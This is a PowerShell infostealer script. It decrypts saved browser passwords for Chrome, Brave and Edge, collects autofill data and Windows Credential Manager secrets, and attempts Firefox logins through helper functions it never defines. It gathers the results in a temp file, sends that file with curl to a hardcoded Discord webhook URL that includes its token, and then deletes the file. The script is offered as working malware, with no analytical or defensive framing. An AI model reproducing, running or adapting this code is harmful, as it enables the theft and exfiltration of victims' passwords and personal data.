# Function to decrypt Chrome passwords
function Get-ChromePasswords {
    try {
        $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
        $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
        $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
        $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

        $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
        $dbConnection.Open()
        $cmd = $dbConnection.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $reader = $cmd.ExecuteReader()

        $passwords = @()
        while ($reader.Read()) {
            $url = $reader["origin_url"]
            $username = $reader["username_value"]
            $encryptedPassword = $reader["password_value"]
            $iv = $encryptedPassword[3..14]
            $payload = $encryptedPassword[15..($encryptedPassword.Length - 1)]
            $cipher = [System.Security.Cryptography.AesGcm]::new($key)
            $password = [System.Text.Encoding]::UTF8.GetString($cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $null, $null))
            $passwords += [pscustomobject]@{URL = $url; Username = $username; Password = $password}
        }
        $dbConnection.Close()
        return $passwords
    } catch {
        Write-Error "Failed to get Chrome passwords: $_"
        return @()
    }
}

# Function to get Chrome autofill data
function Get-ChromeAutofill {
    try {
        $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data"
        $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
        $dbConnection.Open()
        $cmd = $dbConnection.CreateCommand()
        $cmd.CommandText = "SELECT name, value FROM autofill"
        $reader = $cmd.ExecuteReader()

        $autofillData = @()
        while ($reader.Read()) {
            $name = $reader["name"]
            $value = $reader["value"]
            $autofillData += [pscustomobject]@{Name = $name; Value = $value}
        }
        $dbConnection.Close()
        return $autofillData
    } catch {
        Write-Error "Failed to get Chrome autofill data: $_"
        return @()
    }
}

# Function to decrypt Brave passwords (same method as Chrome)
function Get-BravePasswords {
    try {
        $localStatePath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
        $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
        $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
        $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

        $dbPath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
        $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
        $dbConnection.Open()
        $cmd = $dbConnection.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $reader = $cmd.ExecuteReader()

        $passwords = @()
        while ($reader.Read()) {
            $url = $reader["origin_url"]
            $username = $reader["username_value"]
            $encryptedPassword = $reader["password_value"]
            $iv = $encryptedPassword[3..14]
            $payload = $encryptedPassword[15..($encryptedPassword.Length - 1)]
            $cipher = [System.Security.Cryptography.AesGcm]::new($key)
            $password = [System.Text.Encoding]::UTF8.GetString($cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $null, $null))
            $passwords += [pscustomobject]@{URL = $url; Username = $username; Password = $password}
        }
        $dbConnection.Close()
        return $passwords
    } catch {
        Write-Error "Failed to get Brave passwords: $_"
        return @()
    }
}

# Function to get Brave autofill data (same method as Chrome)
function Get-BraveAutofill {
    try {
        $dbPath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
        $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
        $dbConnection.Open()
        $cmd = $dbConnection.CreateCommand()
        $cmd.CommandText = "SELECT name, value FROM autofill"
        $reader = $cmd.ExecuteReader()

        $autofillData = @()
        while ($reader.Read()) {
            $name = $reader["name"]
            $value = $reader["value"]
            $autofillData += [pscustomobject]@{Name = $name; Value = $value}
        }
        $dbConnection.Close()
        return $autofillData
    } catch {
        Write-Error "Failed to get Brave autofill data: $_"
        return @()
    }
}

# Function to decrypt Firefox passwords
function Get-FirefoxPasswords {
    try {
        $profilesPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
        $passwords = @()

        foreach ($profile in Get-ChildItem -Path $profilesPath) {
            $loginsJsonPath = "$profile\logins.json"
            $key4DbPath = "$profile\key4.db"
            if (Test-Path $loginsJsonPath -and Test-Path $key4DbPath) {
                $loginsJson = Get-Content -Path $loginsJsonPath -Raw | ConvertFrom-Json
                $key4Db = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$key4DbPath;Version=3;")
                $key4Db.Open()
                $keyCmd = $key4Db.CreateCommand()
                $keyCmd.CommandText = "SELECT item1, item2 FROM metadata WHERE id = 'password';"
                $keyReader = $keyCmd.ExecuteReader()
                $keyReader.Read()
                $globalSalt = $keyReader["item1"]
                $item2 = $keyReader["item2"]
                $key4Db.Close()

                # Decrypt globalSalt and item2 using the user's password (need to prompt for this)
                $userPassword = Read-Host "Enter your Firefox master password" -AsSecureString
                $userPasswordBytes = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($userPassword) | ForEach-Object { [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($_) } | ForEach-Object { [System.Text.Encoding]::UTF8.GetBytes($_) }
                $key = Get-FirefoxKey $globalSalt $item2 $userPasswordBytes

                foreach ($login in $loginsJson.logins) {
                    $password = Decrypt-FirefoxPassword $login.encryptedPassword $key
                    $passwords += [pscustomobject]@{
                        URL = $login.hostname
                        Username = $login.encryptedUsername
                        Password = $password
                    }
                }
            }
        }
        return $passwords
    } catch {
        Write-Error "Failed to get Firefox passwords: $_"
        return @()
    }
}

# Function to get Edge passwords
function Get-EdgePasswords {
    try {
        $localStatePath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Local State"
        $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
        $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
        $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

        $dbPath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
        $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
        $dbConnection.Open()
        $cmd = $dbConnection.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $reader = $cmd.ExecuteReader()

        $passwords = @()
        while ($reader.Read()) {
            $url = $reader["origin_url"]
            $username = $reader["username_value"]
            $encryptedPassword = $reader["password_value"]
            $iv = $encryptedPassword[3..14]
            $payload = $encryptedPassword[15..($encryptedPassword.Length - 1)]
            $cipher = [System.Security.Cryptography.AesGcm]::new($key)
            $password = [System.Text.Encoding]::UTF8.GetString($cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $null, $null))
            $passwords += [pscustomobject]@{URL = $url; Username = $username; Password = $password}
        }
        $dbConnection.Close()
        return $passwords
    } catch {
        Write-Error "Failed to get Edge passwords: $_"
        return @()
    }
}

# Function to get Edge autofill data
function Get-EdgeAutofill {
    try {
        $dbPath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data"
        $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
        $dbConnection.Open()
        $cmd = $dbConnection.CreateCommand()
        $cmd.CommandText = "SELECT name, value FROM autofill"
        $reader = $cmd.ExecuteReader()

        $autofillData = @()
        while ($reader.Read()) {
            $name = $reader["name"]
            $value = $reader["value"]
            $autofillData += [pscustomobject]@{Name = $name; Value = $value}
        }
        $dbConnection.Close()
        return $autofillData
    } catch {
        Write-Error "Failed to get Edge autofill data: $_"
        return @()
    }
}

# Function to get Credential Manager passwords
function Get-CredentialManagerPasswords {
    try {
        $credentials = Get-StoredCredential -Type Generic | Where-Object { $_.TargetName -like "LegacyGeneric:target=" }
        $result = @()
        foreach ($credential in $credentials) {
            $result += [pscustomobject]@{
                Target = $credential.TargetName
                Username = $credential.UserName
                Password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password))
            }
        }
        return $result
    } catch {
        Write-Error "Failed to get Credential Manager passwords: $_"
        return @()
    }
}

# Combine results and save to file
$chromePasswords = Get-ChromePasswords
$chromeAutofill = Get-ChromeAutofill
$bravePasswords = Get-BravePasswords
$braveAutofill = Get-BraveAutofill
$firefoxPasswords = Get-FirefoxPasswords
$edgePasswords = Get-EdgePasswords
$edgeAutofill = Get-EdgeAutofill
$credentialManagerPasswords = Get-CredentialManagerPasswords

$outputPath = "$env:TEMP\credentials.txt"
if ($chromePasswords.Count -gt 0) {
    $chromePasswords | Out-File -FilePath $outputPath -Append
} else {
    Add-Content -Path $outputPath -Value "No Chrome passwords found."
}

if ($chromeAutofill.Count -gt 0) {
    $chromeAutofill | Out-File -FilePath $outputPath -Append
} else {
    Add-Content -Path $outputPath -Value "No Chrome autofill data found."
}

if ($bravePasswords.Count -gt 0) {
    $bravePasswords | Out-File -FilePath $outputPath -Append
} else {
    Add-Content -Path $outputPath -Value "No Brave passwords found."
}

if ($braveAutofill.Count -gt 0) {
    $braveAutofill | Out-File -FilePath $outputPath -Append
} else {
    Add-Content -Path $outputPath -Value "No Brave autofill data found."
}

if ($firefoxPasswords.Count -gt 0) {
    $firefoxPasswords | Out-File -FilePath $outputPath -Append
} else {
    Add-Content -Path $outputPath -Value "No Firefox passwords found."
}

if ($edgePasswords.Count -gt 0) {
    $edgePasswords | Out-File -FilePath $outputPath -Append
} else {
    Add-Content -Path $outputPath -Value "No Edge passwords found."
}

if ($edgeAutofill.Count -gt 0) {
    $edgeAutofill | Out-File -FilePath $outputPath -Append
} else {
    Add-Content -Path $outputPath -Value "No Edge autofill data found."
}

if ($credentialManagerPasswords.Count -gt 0) {
    $credentialManagerPasswords | Out-File -FilePath $outputPath -Append
} else {
    Add-Content -Path $outputPath -Value "No Credential Manager passwords found."
}

# Upload to Discord
$webhookUrl = "https://discordapp.com/api/webhooks/1163648209806180373/1a4UKrWxReg-ICzIMM-Q3Pt14l02wOnM3MUdb4LU6RHs_DlGiFjzq_K0jpFB_yFUDP2R"
$curlCmd = "curl.exe -F `file1=@$outputPath` $webhookUrl"
Invoke-Expression -Command $curlCmd

Remove-Item -Path $outputPath
